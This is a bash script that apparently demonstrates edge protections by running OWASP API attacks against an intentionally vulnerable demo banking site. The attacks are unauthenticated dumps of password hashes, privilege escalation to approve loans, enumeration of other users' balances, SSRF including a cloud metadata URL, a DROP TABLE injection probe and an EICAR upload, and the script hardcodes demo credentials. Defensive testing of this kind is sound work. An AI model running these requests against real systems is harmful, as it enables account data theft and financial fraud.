#!/usr/bin/env bash
# attack-simulation.sh — exercises every intentional Phase 4 vulnerability.
#
# Usage:
#   ./attack-simulation.sh before    # vulnerable baseline: every exploit should
#                                    # SUCCEED (prints VULNERABLE)
#   ./attack-simulation.sh after     # protections armed: every exploit should be
#                                    # BLOCKED by the edge (prints BLOCKED)
#   BASE_URL=http://127.0.0.1:8787 ./attack-simulation.sh before
#
# "before" run prerequisites: Cloudflare managed rules relaxed / schema
# validation at log / pre-staged rules disabled on the demo hostname.
# "after" run prerequisites: upload openapi-schema.yaml, schema validation ->
# block + fallthrough rule, JWT validation rules, rate limiting rules, content
# scanning — see BUILD-PLAN.md Phase 4 matrix for the exact mapping printed
# beside each attack.
#
# Damage control baked in: express transfers send $0.01, the forced-approve loan
# is applied for inside this script ($3000 pending_review first, then approved),
# and API6 spams >=$2000 applications so nothing disburses. Every run adds its
# residue to the demo user's history — it reconciles with balances by design.

MODE="${1:-before}"
[ "$MODE" = "after" ] && AFTER=1 || AFTER=0
BASE_URL="${BASE_URL:-https://banking.puregroundscoffee.com}"
USERNAME="${DEMO_USERNAME:-chris.brown}"
PASSWORD="${DEMO_PASSWORD:-cbrown123}"

VULN=0; BLOCKED=0; ODD=0

status() { # status <path>  -> prints HTTP status, body to /tmp/atk.body
  local path="$1"; shift
  local code; code=$(curl.exe -s "${CURL_AUTH[@]}" --ssl-no-revoke "$@" -o /tmp/atk.body -w "%{http_code}" "$BASE_URL$path")
  echo "$code"
}

verdict() { # verdict <label> <succeeded?> <detail>
  local label="$1" ok_exploit="$2" detail="$3"
  if [ "$AFTER" = "1" ]; then
    if [ "$ok_exploit" = "no" ]; then BLOCKED=$((BLOCKED+1)); echo "BLOCKED    $label ($detail)"
    else ODD=$((ODD+1)); echo "NOT-BLOCKED $label ($detail)"; fi
  else
    if [ "$ok_exploit" = "yes" ]; then VULN=$((VULN+1)); echo "VULNERABLE $label ($detail)"
    else ODD=$((ODD+1)); echo "UNEXPECTED $label ($detail)"; fi
  fi
}

echo "=== attack-simulation.sh — mode: $MODE ==="
echo "Target: $BASE_URL (attacker identity: $USERNAME)"
echo

# Attacker session: an ordinary, legitimate customer login. --------
LOGIN=$(curl.exe -s --ssl-no-revoke -X POST -H 'Content-Type: application/json' \
  -d "{\"username\":\"$USERNAME\",\"password\":\"$PASSWORD\"}" "$BASE_URL/api/auth/login")
TOKEN=$(sed -n 's/.*"token":"\([^"]*\)".*/\1/p' <<<"$LOGIN" | head -1)
[ -z "$TOKEN" ] && { echo "FATAL: attacker login failed: $LOGIN"; exit 1; }
CURL_AUTH=(-H "Authorization: Bearer $TOKEN")
ACCOUNTS=$(curl.exe -s "${CURL_AUTH[@]}" --ssl-no-revoke "$BASE_URL/api/accounts")
SAVINGS_ID=$(sed -n 's/.*{"id":"\([^"]*\)"[^{]*"account_type":"savings".*/\1/p' <<<"$ACCOUNTS" | head -1)
echo "attacker authenticated (Regular role); savings account $SAVINGS_ID"
echo

# --- API2: Broken authentication ------------------------------------------
echo "--- API2 Broken Authentication ---"
echo "curl $BASE_URL/api/internal/debug        (no credentials at all)"
code=$(curl.exe -s --ssl-no-revoke -o /tmp/atk.body -w "%{http_code}" "$BASE_URL/api/internal/debug")
if grep -q password_hash /tmp/atk.body; then verdict "API2 /api/internal/debug" yes "unauthenticated dump of user table incl. password hashes"
elif [ "$code" = "403" ] || [ "$code" = "401" ]; then verdict "API2 /api/internal/debug" no "$code (JWT validation rule)"
else verdict "API2 /api/internal/debug" odd "$code"; fi
echo

# --- API9: Improper inventory (shadow API) --------------------------------
echo "--- API9 Improper Inventory Management ---"
echo "curl $BASE_URL/api/v1/accounts           (deprecated endpoint, absent from the OpenAPI schema)"
code=$(status /api/v1/accounts)
if grep -q '"apiVersion":"v1' /tmp/atk.body; then verdict "API9 /api/v1/accounts" yes "shadow endpoint serves verbose rows"
elif [ "$code" = "403" ]; then verdict "API9 /api/v1/accounts" no "$code (fallthrough rule — not in schema)"
else verdict "API9 /api/v1/accounts" odd "$code"; fi
echo

# --- API5: Broken function level authorization -----------------------------
echo "--- API5 Broken Function Level Authorization ---"
echo "GET /api/admin/users                     (Regular user token, no admin role)"
code=$(status /api/admin/users)
if grep -q '"role":"Admin"' /tmp/atk.body; then verdict "API5 /api/admin/users" yes "regular user listed every account holder"
elif [ "$code" = "403" ]; then verdict "API5 /api/admin/users" no "$code (fallthrough + role-claim rules)"
else verdict "API5 /api/admin/users" odd "$code"; fi

echo "apply for \$3000 loan -> pending_review, then POST /api/admin/loans/:id/force-approve"
code=$(status /api/loans/apply -H 'Content-Type: application/json' -d "{\"amount\":3000,\"termMonths\":24,\"disburseAccountId\":\"$SAVINGS_ID\"}")
LOAN_ID=$(sed -n 's/.*"id":"\([^"]*\)".*/\1/p' /tmp/atk.body | head -1)
if [ -n "$LOAN_ID" ]; then
  code=$(status "/api/admin/loans/$LOAN_ID/force-approve" -X POST)
  if grep -q '"status":"approved"' /tmp/atk.body; then verdict "API5 force-approve" yes "pending \$3000 loan approved+disbursed by a Regular user ($LOAN_ID)"
  elif [ "$code" = "403" ]; then verdict "API5 force-approve" no "$code (fallthrough + role-claim rules; loan stays pending_review)"
  else verdict "API5 force-approve" odd "$code"; fi
else verdict "API5 force-approve" odd "loan application step failed: $(cat /tmp/atk.body)"; fi
echo

# --- API1: BOLA --------------------------------------------------------------
echo "--- API1 Broken Object Level Authorization ---"
IDS=$(grep -oE '"id":"[0-9a-f-]{36}"' /dev/null 2>/dev/null)
# Enumerate targets from the API2 dump if it answered; otherwise try the
# demo user's own id plus every id the admin list leaked, whichever exists.
code=$(curl.exe -s --ssl-no-revoke -o /tmp/atk.body -w "%{http_code}" "$BASE_URL/api/internal/debug")
IDS=$(grep -oE '"id":"[0-9a-f-]{36}"' /tmp/atk.body | cut -d'"' -f4 | sort -u | head -6)
[ -z "$IDS" ] && code=$(status /api/admin/users) && IDS=$(grep -oE '"id":"[0-9a-f-]{36}"' /tmp/atk.body | cut -d'"' -f4 | sort -u | head -6)
# Fallback: known-seeded user id, so the enumeration attempt itself is still
# demonstrated even when every user-list endpoint is already blocked.
[ -z "$IDS" ] && IDS="${BOLA_FALLBACK_USER_ID:-f49a7d79-e6dc-4c91-ba4a-5d62be9f81e7}"
HITS=0; DENIED=0
for uid in $IDS; do
  code=$(status "/api/users/$uid/balance")
  grep -q '"balance"' /tmp/atk.body && HITS=$((HITS+1))
  [ "$code" = "429" ] || [ "$code" = "403" ] && DENIED=$((DENIED+1))
done
if [ "$HITS" -gt 0 ]; then verdict "API1 balance enumeration" yes "read other users' balances ($HITS profiles harvested)"
elif [ "$DENIED" -gt 0 ]; then verdict "API1 balance enumeration" no "edge rate limiting / rule blocked the enumeration"
else verdict "API1 balance enumeration" odd "no targets available (user list blocked upstream — that itself is a win)"; fi
echo

# --- API3: Excessive data exposure -------------------------------------------
echo "--- API3 Excessive Data Exposure ---"
code=$(status '/api/profile')
if grep -q passwordHash /tmp/atk.body; then
  if [ "$AFTER" = "1" ]; then
    echo "INFO       API3 /api/profile base response still leaks the hash — by design: the edge cannot redact response bodies. This line is the app's fix-me residue, not an edge miss."
  else
    verdict "API3 /api/profile" yes "base response leaks password hash + salt"
  fi
else verdict "API3 /api/profile" odd "$code"; fi
code=$(status '/api/profile?internal=1')
if grep -q '"internal"' /tmp/atk.body; then verdict "API3 ?internal=1" yes "undocumented param flips endpoint to full-record mode"
elif [ "$code" = "400" ] || [ "$code" = "403" ]; then verdict "API3 ?internal=1" no "$code (schema validation rejected undeclared query param)"
else verdict "API3 ?internal=1" odd "$code"; fi
echo

# --- API4: Unrestricted resource consumption ----------------------------------
echo "--- API4 Unrestricted Resource Consumption ---"
echo "20 x \$0.01 express transfers, no pauses"
OKN=0; THROTTLED=0; FORBIDDEN=0
for i in $(seq 1 20); do
  code=$(status /api/transfers/express -X POST -H 'Content-Type: application/json' \
    -d "{\"fromAccountId\":\"$SAVINGS_ID\",\"toUsername\":\"sarah.johnson\",\"toAccountType\":\"savings\",\"amount\":0.01,\"note\":\"burst $i\"}")
  [ "$code" = "201" ] && OKN=$((OKN+1))
  [ "$code" = "429" ] && THROTTLED=$((THROTTLED+1))
  [ "$code" = "403" ] && FORBIDDEN=$((FORBIDDEN+1))
done
if [ "$OKN" -eq 20 ]; then verdict "API4 express-transfer burst" yes "20/20 succeeded — no rate limiting on the endpoint"
elif [ "$THROTTLED" -gt 0 ] || [ "$FORBIDDEN" -gt 0 ]; then verdict "API4 express-transfer burst" no "$THROTTLED throttled (429 rate limit) + $FORBIDDEN fallthrough-blocked (403, path not in schema)"
else verdict "API4 express-transfer burst" odd "$OKN ok / $THROTTLED throttled / $FORBIDDEN forbidden"; fi
echo

# --- API6: Sensitive business flows (no daily cap) ------------------------------
echo "--- API6 Unrestricted Access to Sensitive Business Flows ---"
echo "8 rapid loan applications (>=\$2000 each, all pending_review, none disbursed)"
OKN=0; THROTTLED=0
for i in $(seq 1 8); do
  code=$(status /api/loans/apply -X POST -H 'Content-Type: application/json' -d "{\"amount\":2000,\"termMonths\":12}")
  [ "$code" = "201" ] && OKN=$((OKN+1))
  [ "$code" = "429" ] && THROTTLED=$((THROTTLED+1))
done
if [ "$OKN" -eq 8 ]; then verdict "API6 loan-application spam" yes "8/8 filed in seconds — no per-user daily cap"
elif [ "$THROTTLED" -gt 0 ]; then verdict "API6 loan-application spam" no "$THROTTLED throttled by rate limiting rule"
else verdict "API6 loan-application spam" odd "$OKN ok / $THROTTLED throttled"; fi
echo

# --- API7: SSRF ------------------------------------------------------------------
echo "--- API7 Server-Side Request Forgery ---"
code=$(status /api/profile/avatar-from-url -X POST -H 'Content-Type: application/json' \
  -d '{"url":"https://example.com/"}')
if grep -q bodyPreview /tmp/atk.body; then verdict "API7 avatar-from-url" yes "Worker fetched an attacker-chosen URL and exfiltrated the body"
elif [ "$code" = "400" ] || [ "$code" = "403" ]; then verdict "API7 avatar-from-url" no "$code (URL not in the schema allowlist)"
else verdict "API7 avatar-from-url" odd "$code: $(head -c 120 /tmp/atk.body)"; fi
echo "(demo note: also paste {\"url\":\"http://169.254.169.254/latest/meta-data\"} — same block; Workers can't reach link-local, so example.com is the visible exfil proof)"
echo

# --- API8: Security misconfiguration ----------------------------------------------
echo "--- API8 Security Misconfiguration ---"
code=$(status /api/debug/parse -X POST -H 'Content-Type: application/json' -d '{not json')
if grep -q '"stack"' /tmp/atk.body; then verdict "API8 /api/debug/parse" yes "500 leaked JS stack trace + internal hints"
elif [ "$code" = "400" ] || [ "$code" = "403" ]; then verdict "API8 /api/debug/parse" no "$code (edge rejected it — strict typing in the schema, or fallthrough since this showcase path is undocumented)"
else verdict "API8 /api/debug/parse" odd "$code: $(head -c 120 /tmp/atk.body)"; fi
echo

# --- Companion surfaces (not OWASP-numbered) ---------------------------------------
echo "--- Companion: WAF managed rules / content scanning ---"
code=$(curl.exe -s "${CURL_AUTH[@]}" --ssl-no-revoke -o /tmp/atk.body -w "%{http_code}" \
  "$BASE_URL/api/transactions?sort=amount%3BDROP%20TABLE%20users%3B--")
echo "SQLi probe (?sort=amount;DROP TABLE users;--) -> HTTP $code"
if [ "$code" = "403" ]; then echo "INFO       managed WAF blocked it at the edge (observed since Phase 2 — expected in BOTH runs)"; fi

EICAR_FILE=$(mktemp --suffix=.com)
printf '%s' 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > "$EICAR_FILE"
code=$(curl.exe -s "${CURL_AUTH[@]}" --ssl-no-revoke -o /tmp/atk.body -w "%{http_code}" \
  -X POST -F "file=@$EICAR_FILE" "$BASE_URL/api/uploads")
if [ "$code" = "201" ]; then
  EICAR_ID=$(sed -n 's/.*"id":"\([^"]*\)".*/\1/p' /tmp/atk.body | head -1)
  verdict "EICAR upload" yes "test-malware file accepted and stored"
  status "/api/uploads/$EICAR_ID" -X DELETE >/dev/null; echo "           (object deleted afterwards — bucket stays clean)"
elif [ "$code" = "403" ]; then verdict "EICAR upload" no "$code (malicious uploads detection)"
elif [ "$code" = "302" ]; then BLOCKED=$((BLOCKED+1)); echo "CLIENT-BLOCKED EICAR upload (302 to a Cloudflare Gateway block page — the demo machine's own network proxy intercepted it before it left the machine; demo content scanning from a clean network or device instead)"
else verdict "EICAR upload" odd "$code"; fi
rm -f "$EICAR_FILE"
echo

echo "=== Summary ==="
if [ "$AFTER" = "1" ]; then
  echo "BLOCKED: $BLOCKED   NOT-BLOCKED: $ODD"
  [ "$ODD" -eq 0 ] && echo "All exploits stopped at the edge." || echo "Review the NOT-BLOCKED lines before showing this run."
else
  echo "VULNERABLE: $VULN   OTHER: $ODD"
  echo "Every VULNERABLE line should flip to BLOCKED after the Cloudflare rules go on."
fi
